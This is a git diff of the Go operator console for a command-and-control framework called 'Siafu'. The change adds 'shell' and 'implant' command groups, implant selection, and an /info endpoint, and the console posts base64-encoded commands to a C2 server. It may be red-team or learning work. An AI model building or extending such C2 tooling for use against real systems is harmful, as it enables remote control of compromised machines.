@@ -16,7 +16,7 @@ import (
 )
 
 const (
-    serverURL = "http://192.168.0.54:8443/operator" // Replace this with your server URL
+    serverURL = "http://192.168.0.54:8443" // Replace this with your server URL
     operatorID = "123abc"
 )
 
@@ -26,6 +26,9 @@ type Command struct {
     Response string `json:"Response"`
 }
 
+var implant_cmd bool
+var server_cmd bool
+var implantID string
 
 
 func main() {
@@ -35,7 +38,11 @@ func main() {
     for {
         reader := bufio.NewReader(os.Stdin)
         fmt.Print(orange)
-        fmt.Print("Siafu >> ")
+        if implantID != "" {
+            fmt.Printf("Siafu [Implant: %s] >> ", implantID)
+        } else {
+            fmt.Print("Siafu >> ")
+        }
         fmt.Print(reset) 
         input, err := reader.ReadString('\n')
         if err != nil {
@@ -57,26 +64,72 @@ func main() {
             
             continue
         }
-
+//var foundImplantID bool
         cmdGroup := parts[0]
-        cmdString := strings.Join(parts[1:], " ")
+        switch cmdGroup {
+        case "shell":
+            implant_cmd = true
+        case "implant":
+            ID_Set := false
+            for _, part := range parts {
+                if strings.HasPrefix(part, "-s") {
+                    subPart := strings.Split(parts[2], " ")
+                    implantID = subPart[0]
+                    fmt.Println(implantID)
 
-        // Send the command to the server
-        err = sendCommand(cmdGroup, cmdString)
-        if err != nil {
+                    if implantID != "" {
+                        server_cmd = false
+                        ID_Set = true
+                        break
+                    }
+
+                }
+            }
+            if !ID_Set {
+                server_cmd = true
+            }
+            
+        default:
             fmt.Print(red)
-            fmt.Println("Error sending command:", err)
+            fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
             fmt.Print(reset)
             
             continue
+        }
+        cmdString := strings.Join(parts[1:], " ")
+
+        if implant_cmd {
+            // Send the command to the server
+            err = sendCommand(cmdGroup, cmdString)
+            if err != nil {
+                fmt.Print(red)
+                fmt.Println("Error sending command:", err)
+                fmt.Print(reset)
+                
+                continue
+            }
+        }
+        
+        if server_cmd { // Corrected syntax here
+            err = servercommand(cmdGroup, cmdString)
+            if err != nil {
+                fmt.Print(red)
+                fmt.Println("Error sending command:", err)
+                fmt.Print(reset)
+                
+                continue
+            }
         }
     }
 }
 
 func sendCommand(cmdGroup, cmdString string) error {
+    endpoint := "/operator"
+    server := serverURL + endpoint
+    fmt.Println(server)
     client := &http.Client{}
 
-    commandURL := serverURL
+    commandURL := server
     
     cmdData := Command{
         Group:   cmdGroup,
@@ -97,7 +150,6 @@ func sendCommand(cmdGroup, cmdString string) error {
     // Base64 encode the JSON data
     base64Data := base64.StdEncoding.EncodeToString(jsonData)
 
-    implantID := "255"
     // Create HTTP request
     req, err := http.NewRequest("POST", commandURL, bytes.NewBuffer([]byte(base64Data)))
     if err != nil {
@@ -143,26 +195,6 @@ func sendCommand(cmdGroup, cmdString string) error {
         }
         time.Sleep(100 * time.Millisecond) // Wait for a short duration before trying again
     }
-
-
-    //Debugging
-/*
-    for i, char := range decodedData {
-        if char < 32 || char > 126 {
-            fmt.Printf("Unexpected character at index %d: %v (hex: %x)\n", i, char, char)
-        }
-    }
-    for i := len(decodedData) - 1; i >= 0; i-- {
-        // Check if the character is a space
-        if decodedData[i] == ' ' {
-            fmt.Println("Trailing space found")
-        } else {
-            // If a non-space character is encountered, break the loop
-            break
-        }
-    }
-*/
-    //////
     
     // Unmarshal JSON
    var respstruct Command
@@ -179,6 +211,96 @@ func sendCommand(cmdGroup, cmdString string) error {
     defer resp.Body.Close()
     return nil
 }
+
+
+func servercommand(cmdGroup, cmdString string) error {
+    endpoint := "/info"
+    server := serverURL + endpoint
+    fmt.Println(server)
+    client := &http.Client{}
+
+    commandURL := server
+    
+    cmdData := Command{
+        Group:   cmdGroup,
+        String:  cmdString,
+        Response: "", 
+    }
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        // Send request to server
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        
+    // Serialize command data to JSON
+    jsonData, err := json.Marshal(cmdData)
+    if err != nil {
+        return fmt.Errorf("error marshaling JSON data: %w", err)
+    }
+
+    // Base64 encode the JSON data
+    base64Data := base64.StdEncoding.EncodeToString(jsonData)
+
+    // Create HTTP request
+    req, err := http.NewRequest("GET", commandURL, bytes.NewBuffer([]byte(base64Data)))
+    if err != nil {
+        return fmt.Errorf("error creating HTTP request: %w", err)
+    }
+    req.Header.Set("Content-Type", "text/plain") // Set content type to text/plain
+    req.Header.Set("Operator-ID", operatorID)
+
+    // Send request
+    resp, err := client.Do(req)
+    if err != nil {
+        return err
+    }
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        // Receive response from server
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        
+    var responseBytes []byte
+    var responseBody string
+    var decodedData []byte
+    for {
+        // Read the response
+        responseBytes, err = ioutil.ReadAll(resp.Body)
+        if err != nil {
+            return fmt.Errorf("error reading response body: %w", err)
+        }
+        responseBody = string(responseBytes) // Convert []byte to string
+    // Extract and decode data value
+        dataIndex := strings.Index(responseBody, "Data:")
+        if dataIndex != -1 {
+            data := strings.TrimSpace(responseBody[dataIndex+len("Data:"):])
+            decodedData, err = base64.StdEncoding.DecodeString(data)
+            if err != nil {
+                return fmt.Errorf("error decoding base64 data: %w", err)
+            }
+        } else {
+            fmt.Println("Data not found in response")
+        }
+        if len(responseBody) > 0 {
+            break
+        }
+        time.Sleep(100 * time.Millisecond) // Wait for a short duration before trying again
+    }
+    
+    // Unmarshal JSON
+   var respstruct Command
+
+   // Trim leading and trailing whitespace
+   decodedData = bytes.TrimSpace(decodedData)
+   
+   err = json.Unmarshal(decodedData, &respstruct)
+   if err != nil {
+       return fmt.Errorf("Failed to unmarshal JSON: %s", err)
+   }
+   
+    fmt.Println("CmdResponse:", respstruct.Response)
+    defer resp.Body.Close()
+    return nil
+}
+
 
 // Helper functions to convert uint32 to bytes and vice versa
 func uint32ToBytes(n uint32) []byte {
